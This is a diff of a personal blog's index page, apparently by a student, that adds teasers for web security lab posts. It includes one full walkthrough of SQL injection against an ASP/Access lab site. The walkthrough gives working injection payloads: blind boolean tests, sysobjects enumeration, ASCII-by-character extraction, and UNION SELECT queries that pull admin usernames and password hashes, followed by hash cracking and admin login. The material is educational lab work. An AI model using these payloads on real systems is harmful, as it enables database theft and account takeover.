@@ -366,6 +366,1090 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——盲注攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/02/Web安全实验——盲注攻击/" class="post-title-link" itemprop="url">Web安全实验——盲注攻击</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 21:51:45 / Modified: 23:15:50" itemprop="dateCreated datePublished" datetime="2019-07-02T21:51:45+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>盲注攻击首先尝试提交一些无效的请求，并观察应用程序如何处理这些错误，以及如果出现SQL错误会发生的情况，定位可用错误。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/02/Web安全实验——盲注攻击/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——基于access的网站搭建和SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/02/Web安全实验——基于access的网站搭建和SQL注入/" class="post-title-link" itemprop="url">Web安全实验——基于access的网站搭建和SQL注入</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 21:10:20 / Modified: 23:13:49" itemprop="dateCreated datePublished" datetime="2019-07-02T21:10:20+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h2 id="基于access的网站搭建和SQL注入实验"><a href="#基于access的网站搭建和SQL注入实验" class="headerlink" title="基于access的网站搭建和SQL注入实验"></a>基于access的网站搭建和SQL注入实验</h2><h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一. 实验目的"></a>一. 实验目的</h2><p>1.了解常用web 脚本</p>
+<p>2.了解常用web 脚本漏洞的利用点</p>
+<h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二. 实验原理"></a>二. 实验原理</h2><p>猜解表名：</p>
+<p>　　 SQL SERVER的每一个数据库都会有用户表和系统表，在系统表sysobjects中， 数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在sysobjects表中占一行，那么也就是说当前数据库的表名都会在该表内有存在。我们常用到的参数有三个，name （数据表的名字），xtype（数据表的类型 u为用户表），id（ 数据表的对象标志）。 ａｎｄ (ｓｅｌｅｃｔ top 1 name from sysobjects where xtype=＇u＇)&gt;0 (得到第一个表名:比如user) ａｎｄ (ｓｅｌｅｃｔ top 1 name from sysobjects where xtype=＇u＇ ａｎｄ name not in (＇user＇))&gt;0 得到第二个表名，后面的以此类推。 猜解列名：</p>
+<p>用到系统自带的2个函数col_name()和object_id()，col_name()的格式是“COL_NAME( table_id , column_id )参数table_id是表的标识号，column_id是列的标识号，object_id(admin)就是得到admin在sysobjects 中的标识号，column_id=1,2,3表明admin的第1，2，3列。 ａｎｄ (ｓｅｌｅｃｔ top 1 col_name(object_id(＇admin＇),1) from sysobjects)&gt;0 【得到admin字段的第一个列名“username”依次类推，得到“password”“id”等等】 猜解字段内容：</p>
+<p>　　　 ａｎｄ (ｓｅｌｅｃｔ top 1 username from [admin])&gt;0 【直接得到用户名】 　　　 ａｎｄ (ｓｅｌｅｃｔ top 1 password from [admin])&gt;0 【直接得到密码】 　　　 ｕｎｉｏｎ联合查询： 　　　 ｓｅｌｅｃｔ name,password,id from user ｕｎｉｏｎ ｓｅｌｅｃｔ user,pwd,uid from 表名 ａｎｄ 1=1 ｕｎｉｏｎ ｓｅｌｅｃｔ 1,2,3,4,5… from 表名 (数值从1开始慢慢加，如果加到5返回正常，那就存在5个字段) ASCII逐字解码法：</p>
+<p>（1）猜解列长度 ａｎｄ (ｓｅｌｅｃｔ top 1 len(列名)from 表名)&gt;N 其中N是数字，变换这个N的值猜解列长度，当N为6正确，为7错误，则长度为7 猜解第二条记录就该使用：ｓｅｌｅｃｔ top 1 len(列名) from 表名 where 列名 not in (ｓｅｌｅｃｔ top 1 列名 from 表名) （2）猜解用户和密码 ASC()函数和Mid函数,ASC(mid(列名,N,1))得到“列名”第N位字符ASCII码 猜解语句为：ａｎｄ (ｓｅｌｅｃｔ top 1 asc(mid(字段,1,1)) from 数据库名)&gt;ASCII码 区间判断语句：….between……ａｎｄ…… 中文处理法:当ASCII转换后为“负数”使用abs()函数取绝对值。 例：ａｎｄ (ｓｅｌｅｃｔ top 1 abs(asc(mid(字段,1,1))) from 数据库名)=ASC码 （3）ASCII逐字解码法的应用： 　　 　　1、猜解表名：ａｎｄ (ｓｅｌｅｃｔ count(<em>) from admin)&lt;&gt;0 　　　　 2、猜解列名：ａｎｄ (ｓｅｌｅｃｔ count(列名) from 表名)&lt;&gt;0 　　　　 3、猜解用户个数：ａｎｄ (ｓｅｌｅｃｔ count(</em>) from 表名)&gt;1,2.. 2正常，3错误，表中有3条记录。 　　　　 4、猜解用户名的长度：ａｎｄ (ｓｅｌｅｃｔ len(列名) from 表名)&gt;=1、&gt;=2、&gt;=3、&gt;=4。 　　　　 5、猜解用户名：ａｎｄ (ｓｅｌｅｃｔ count(*)from 表名 where (asc(mid(列名,1,1))) between 30 ａｎｄ 130)&lt;&gt;0 　　　　 最后提交：ａｎｄ (ｓｅｌｅｃｔ asc(mid(列名,1,1)) from 表名)=ascii的值 　　　　 6、猜解管理员的密码： 　　　　 按照上面的原理，把上面的语句中(asc(mid(列名,1,1)的列名换成PASSWORD就能得到密码了。</p>
+<h2 id="三-实验内容"><a href="#三-实验内容" class="headerlink" title="三. 实验内容"></a>三. 实验内容</h2><p>1.掌握Web脚本利用</p>
+<p>2.掌握Web漏洞利用点</p>
+<p>3.掌握SQL注入工具的使用</p>
+<h2 id="四-实验环境描述"><a href="#四-实验环境描述" class="headerlink" title="四. 实验环境描述"></a>四. 实验环境描述</h2><p>1、学生机与实验室网络直连；</p>
+<p>2、VPC与实验室网络直连；</p>
+<p>3、学生机与VPC物理链路连通；</p>
+<p>pc机：windows7旗舰版 ip：172.16.1.156</p>
+<h2 id="五-实验步骤"><a href="#五-实验步骤" class="headerlink" title="五. 实验步骤"></a>五. 实验步骤</h2><p>注：实验中所有ip(如：172.17.135. <em>或 110.10.10.</em>)均要根据实际网络情况而改变，所用工具windows版的均在D:/tools中，linux版的均在 桌面 上。</p>
+<p>一、 单击实验环境，单击实验环境，点击打开控制以启动网络拓扑中的电脑（即虚拟机）</p>
+<p>二、 win7默认用户名：admin，密码：123456</p>
+<p>三、步骤1：打开aspweb服务器，在ie(推荐用桌面的foxfire浏览器来完成本次实验，IE可能显示不全网页)浏览器，输入<a href="http://192.168.1.149%EF%BC%9A99%EF%BC%88%E7%94%B1%E6%9C%AC%E5%9C%B0%E8%99%9A%E6%8B%9F%E6%9C%BAIP%E5%9C%B0%E5%9D%80%E8%80%8C%E5%AE%9A%EF%BC%8C%E8%8B%A5%E4%B8%8D%E6%83%B3%E6%9F%A5%E7%9C%8Bip%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5127.0.0.1:99%E4%B9%9F%E8%83%BD%E6%89%93%E5%BC%80%E6%9C%AC%E7%BD%91%E7%AB%99%EF%BC%89%E5%A6%82%E5%9B%BE%EF%BC%9A/" target="_blank" rel="noopener">http://192.168.1.149：99（由本地虚拟机IP地址而定，若不想查看ip用浏览器输入127.0.0.1:99也能打开本网站）如图：</a></p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/20b05d3c898d3a10ed0d18d4c58d2e6a.png" alt="图片描述"></p>
+<p>图1</p>
+<p>步骤2：下面开始查找sql注入点，我们随便点击一下如下图的链接。<img src="http://202.204.62.252/uploads/course_data/201805041713081/83aaed5e6c3d7d5daac4a65f27f5bd0b.png" alt="图片描述"></p>
+<p>图2</p>
+<p>步骤3：从下图的地址栏，我们看见有一个是id=171，然后我们测试它是不是注入点。在地址栏后面加上1=1以及加上1=2. 输入<a href="http://127.0.0.1:99/shownews.asp?id=171" target="_blank" rel="noopener">http://127.0.0.1:99/shownews.asp?id=171</a> ａｎｄ 1=1</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/2dc2c21075698824359b6681408fe87e.png" alt="图片描述"></p>
+<p>图3</p>
+<p>步骤4：输入：<a href="http://127.0.0.1/shownews.asp?id=171" target="_blank" rel="noopener">http://127.0.0.1/shownews.asp?id=171</a> ａｎｄ 1=2</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/07f463b46bd0556475fe9cfbf898995a.png" alt="图片描述"></p>
+<p>图4</p>
+<p>步骤5：下面我们来猜测表中的字段，这里我们猜测username及password。（不报错说明我们没有猜错）</p>
+<p><a href="http://127.0.0.1:99/shownews.asp?id=171" target="_blank" rel="noopener">http://127.0.0.1：99/shownews.asp?id=171</a> ａｎｄ （ｓｅｌｅｃｔ count（username） admin）&gt;0</p>
+<p><a href="http://127.0.0.1:99/shownews.asp?id=171" target="_blank" rel="noopener">http://127.0.0.1：99/shownews.asp?id=171</a> ａｎｄ （ｓｅｌｅｃｔ count（password） admin）&gt;0</p>
+<p>步骤6：下面我们来猜测username和password。首先访问<a href="http://127.0.0.1:99/shownews.asp?id=171%EF%BC%8520union%EF%BC%8520select%EF%BC%85201,2,3,4,5,6,7,8,9,10%EF%BC%8520from%EF%BC%8520admin" target="_blank" rel="noopener">http://127.0.0.1:99/shownews.asp?id=171％20union％20select％201,2,3,4,5,6,7,8,9,10％20from％20admin</a> 如图：</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/639c6708a7c93fed2d2e9f71eccd7576.png" alt="图片描述">图5</p>
+<p>步骤7：我们将上面的2换成username，即<a href="http://127.0.0.1:99/shownews.asp?id=171%EF%BC%8520union%EF%BC%8520select%EF%BC%85201,username,3,4,5,6,7,8,9,10%EF%BC%8520from%EF%BC%8520admin" target="_blank" rel="noopener">http://127.0.0.1:99/shownews.asp?id=171％20union％20select％201,username,3,4,5,6,7,8,9,10％20from％20admin</a> 则就可以猜测出密码admin。</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/86e7ec667f290bfeb1afb171cc211727.png" alt="图片描述"></p>
+<p>步骤8：我们将3换成password，即<a href="http://127.0.0.1:99/shownews.asp?id=171%EF%BC%8520union%EF%BC%8520select%EF%BC%85201,2,password,4,5,6,7,8,9,10%EF%BC%8520from%EF%BC%8520admin" target="_blank" rel="noopener">http://127.0.0.1:99/shownews.asp?id=171％20union％20select％201,2,password,4,5,6,7,8,9,10％20from％20admin</a>获得如下密码（密码是加密的，需要使用hash破解器破解）</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/c1873c4c2346d2e959d38c99fed7c2cc.png" alt="图片描述"></p>
+<p>图6</p>
+<p>步骤9：本地主机访问使用md5在线破解，因为没连网所以访问不了cmd5网站，这里破解出的密码为admin。如图：</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/36b771258c40c6cf150486c967240df8.png" alt="图片描述"></p>
+<p>图7</p>
+<p>步骤10：我们打开后台登陆页面。如图：</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/716d2a8a4786d3495190e21fd2ebc898.png" alt="图片描述"></p>
+<p>图8</p>
+<p>步骤11：然后我们输入刚刚破解的用户名和密码来登录。点击“确定”如图：</p>
+<p><img src="http://202.204.62.252/uploads/course_data/201805041713081/69596cd3eaac66315c00414b8c30d48e.png" alt="图片描述"></p>
+<p>图9</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——弱口令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/02/Web安全实验——弱口令/" class="post-title-link" itemprop="url">Web安全实验——弱口令</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 20:41:22 / Modified: 23:16:28" itemprop="dateCreated datePublished" datetime="2019-07-02T20:41:22+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>弱口令指的是仅包含简单数字和字母的口令。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/02/Web安全实验——弱口令/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——文件上传/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/02/Web安全实验——文件上传/" class="post-title-link" itemprop="url">Web安全实验——文件上传</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 20:33:28 / Modified: 23:17:15" itemprop="dateCreated datePublished" datetime="2019-07-02T20:33:28+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>本文将介绍利用ASP技术直接实现文件上传功能。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/02/Web安全实验——文件上传/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/02/Web安全实验——CSRF/" class="post-title-link" itemprop="url">Web安全实验——CSRF</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 20:11:56 / Modified: 23:09:20" itemprop="dateCreated datePublished" datetime="2019-07-02T20:11:56+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>CSRF（Cross-site Request Forgery）是指跨站点请求伪造，也就是跨站漏洞攻击，通常用来指 WEB 网站的这一类漏洞，即在某个恶意站点的页面上，促使访问者请求你的网站的某个URL（通常会用 POST 数据方式），从而达到改变服务器端数据的目的。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/02/Web安全实验——CSRF/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——SQL注入攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/02/Web安全实验——SQL注入攻击/" class="post-title-link" itemprop="url">Web安全实验——SQL注入攻击</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 19:51:16 / Modified: 23:17:46" itemprop="dateCreated datePublished" datetime="2019-07-02T19:51:16+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/02/Web安全实验——SQL注入攻击/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/Web安全实验——XSS跨站脚本攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Klaus">
+      <meta itemprop="description" content="Tough time don't last, tough people do.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Klaus' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/02/Web安全实验——XSS跨站脚本攻击/" class="post-title-link" itemprop="url">Web安全实验——XSS跨站脚本攻击</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-02 19:31:26 / Modified: 23:17:40" itemprop="dateCreated datePublished" datetime="2019-07-02T19:31:26+08:00">2019-07-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>XSS属于被动式的攻击。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/02/Web安全实验——XSS跨站脚本攻击/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/29/Web安全工程师成长之路——Web简介/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -822,1061 +1906,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/07/内网文件传输/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Klaus">
-      <meta itemprop="description" content="Tough time don't last, tough people do.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Klaus' Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/07/内网文件传输/" class="post-title-link" itemprop="url">内网文件传输</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-07 08:31:26" itemprop="dateCreated datePublished" datetime="2019-05-07T08:31:26+08:00">2019-05-07</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-07-02 17:56:27" itemprop="dateModified" datetime="2019-07-02T17:56:27+08:00">2019-07-02</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>设计并实现一个局域网内部的文件传送工具，使用TCP协议进行可靠文字传输。</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/07/内网文件传输/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/组合实践2-白马股组合/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Klaus">
-      <meta itemprop="description" content="Tough time don't last, tough people do.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Klaus' Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/01/组合实践2-白马股组合/" class="post-title-link" itemprop="url">组合实践--（2）白马股组合</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-01 17:01:25 / Modified: 17:03:57" itemprop="dateCreated datePublished" datetime="2019-05-01T17:01:25+08:00">2019-05-01</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          Welcome to my blog, enter password to read.
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/01/组合实践2-白马股组合/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
